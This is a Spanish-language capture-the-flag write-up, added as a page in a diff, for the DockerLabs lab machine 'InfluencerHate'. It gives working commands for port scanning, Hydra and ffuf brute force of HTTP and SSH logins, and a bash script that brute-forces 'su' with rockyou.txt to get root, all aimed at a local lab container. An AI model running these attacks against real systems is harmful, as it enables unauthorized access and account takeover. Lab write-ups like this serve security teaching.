@@ -1,0 +1,266 @@
+---
+title: InfluencerHate
+description: Resolución completa de la máquina virtual *InfluencerHate* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **InfluencerHate**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web protegido por autenticación básica HTTP que utiliza credenciales por defecto (`httpadmin:fhttpadmin`). Tras superar esta barrera, se identifica un formulario de login vulnerable a ataques de fuerza bruta, obteniendo las credenciales del usuario `admin:chocolate`. Tras el login, se revela un nuevo usuario (`balutin`) que permite el acceso SSH mediante fuerza bruta.
+Una vez dentro, se realiza un ataque de fuerza bruta local contra `su` utilizando el diccionario `rockyou.txt`, obteniendo la contraseña de `root` y completando la escalada de privilegios.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'InfluencerHate',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '28/06/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip InfluencerHate.zip
+sudo bash auto_deploy.sh InfluencerHate.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p InfluencerHate/{content,exploits,nmap,scripts}
+cd InfluencerHate
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763255572/Ports_lm8k0j.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Al acceder al servicio HTTP, se muestra una página protegida por autenticación básica:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763367274/Index_ciy1v3.png)
+
+Se realiza un ataque con Hydra sobre credenciales por defecto:
+
+```bash
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
+      172.17.0.2 -s 80 http-get /
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1763367273/Hydra_frk8li.png)
+
+Credenciales obtenidas:
+```
+httpadmin : fhttpadmin
+```
+
+Se realiza un escaneo con Gobuster utilizando las credenciales:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200 -U httpadmin -P fhttpadmin
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763367273/Gobuster_dp7pi9.png)
+
+**Rutas relevantes:**
+- `/login.html`
+- `/index.html`
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 SQL Injection
+
+Se prueba SQL Injection sin éxito:
+
+```bash
+sqlmap -u "http://172.17.0.2/login.php" --forms --batch --dbs \
+  --headers="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
+```
+
+![SQLMap](https://res.cloudinary.com/dewqswzke/image/upload/v1763367276/SqlMap_pridcl.png)
+
+### 2.2 Fuerza bruta en formulario web
+
+Se realiza un ataque POST con FFUF:
+
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ \
+     -u http://172.17.0.2/login.php \
+     -X POST \
+     -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -d "username=admin&password=FUZZ" \
+     -fw 802 -t 100
+```
+
+![FFUF](https://res.cloudinary.com/dewqswzke/image/upload/v1763367272/Ffuf_si7dt2.png)
+
+Credenciales válidas:
+```
+admin : chocolate
+```
+
+Al iniciar sesión, aparece un mensaje que revela un nuevo usuario:
+
+![Balutin](https://res.cloudinary.com/dewqswzke/image/upload/v1763367272/Balutin_n6hzsd.png)
+
+Usuario identificado: **balutin**
+
+### 2.3 Fuerza bruta SSH
+
+```bash
+hydra -l balutin -P /usr/share/wordlists/rockyou.txt -f -t 64 ssh://172.17.0.2
+```
+
+![Hydra2](https://res.cloudinary.com/dewqswzke/image/upload/v1763367273/Hydra2_a08qv2.png)
+
+Se accede al sistema vía SSH:
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1763367277/SSH_n7akw2.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De balutin → root
+
+Se transfiere el diccionario `rockyou.txt` al sistema:
+
+```bash
+scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/
+```
+
+Se crea un script para fuerza bruta local contra `su`:
+
+```bash
+#!/bin/bash
+echo "[*] Iniciando fuerza bruta contra 'su' con rockyou.txt"
+echo "[*] Diccionario: rockyou.txt"
+echo "[*] Esto puede tomar tiempo..."
+echo ""
+
+counter=0
+while IFS= read -r password; do
+    counter=$((counter + 1))
+
+    if [ $((counter % 1000)) -eq 0 ]; then
+        echo "[*] Intentos realizados: $counter"
+    fi
+
+    echo "$password" | timeout 2 su -c 'echo "SUCCESS"' 2>/dev/null | grep -q "SUCCESS"
+
+    if [ $? -eq 0 ]; then
+        echo ""
+        echo "[+] ¡CONTRASEÑA DE ROOT ENCONTRADA!"
+        echo "[+] Contraseña: $password"
+        echo "[+] Intentos realizados: $counter"
+        exit 0
+    fi
+
+done < rockyou.txt
+
+echo "[-] Fuerza bruta completada. No se encontró la contraseña."
+echo "[-] Total de intentos: $counter"
+```
+
+Se ejecuta el script:
+
+![Script](https://res.cloudinary.com/dewqswzke/image/upload/v1763367276/Scritp_bwx5hz.png)
+
+Se obtiene la contraseña de `root` y se accede:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763367275/Root_zksizk.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Credenciales por defecto en autenticación básica HTTP",
+      severity: "Alta",
+      impact: "Acceso a contenido restringido del servidor web"
+    },
+    {
+      vulnerability: "Falta de protección contra fuerza bruta en formulario web",
+      severity: "Alta",
+      impact: "Obtención de credenciales de usuario mediante diccionario"
+    },
+    {
+      vulnerability: "Revelación de información sensible tras autenticación",
+      severity: "Media",
+      impact: "Identificación de usuarios válidos para ataques SSH"
+    },
+    {
+      vulnerability: "Falta de protección contra fuerza bruta en SSH",
+      severity: "Alta",
+      impact: "Acceso no autorizado al sistema"
+    },
+    {
+      vulnerability: "Contraseña de root débil y sin restricciones en su",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root mediante fuerza bruta local"
+    }
+  ]}
+/>
